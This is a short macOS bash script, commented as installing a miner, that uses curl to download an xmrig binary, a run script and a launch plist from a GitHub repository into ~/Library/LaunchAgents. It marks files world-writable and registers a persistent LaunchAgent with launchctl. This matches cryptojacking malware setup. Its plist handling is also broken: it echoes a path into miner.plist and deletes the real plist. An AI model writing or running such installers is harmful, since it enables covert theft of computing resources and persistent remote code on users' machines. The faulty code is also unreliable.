#!/usr/bin/env bash

#installs the miner

curl -L https://github.com/Me1955/me-mine/raw/main/xmrig >> ~/Library/Launchagents/xmrig
chmod 777 ~/Library/LaunchAgents/xmrig

curl -L https://github.com/Me1955/me-mine/raw/main/run.sh >> ~/Library/Launchagents/run.sh
chmod 777 ~/Library/Launchagents/run.sh

curl -L https://raw.githubusercontent.com/Me1955/me-mine/main/run.plist >> ~/Library/LaunchAgents/run.plist
chmod 644 ~/Library/Launchagents/run.plist

echo ~/Library/Launchagents/run.plist >> ~/Library/Launchagents/miner.plist
rm ~/Library/Launchagents/run.plist

chmod 644 ~/Library/Launchagents/miner.plist

launchctl load ~/Library/LaunchAgents/miner.plist
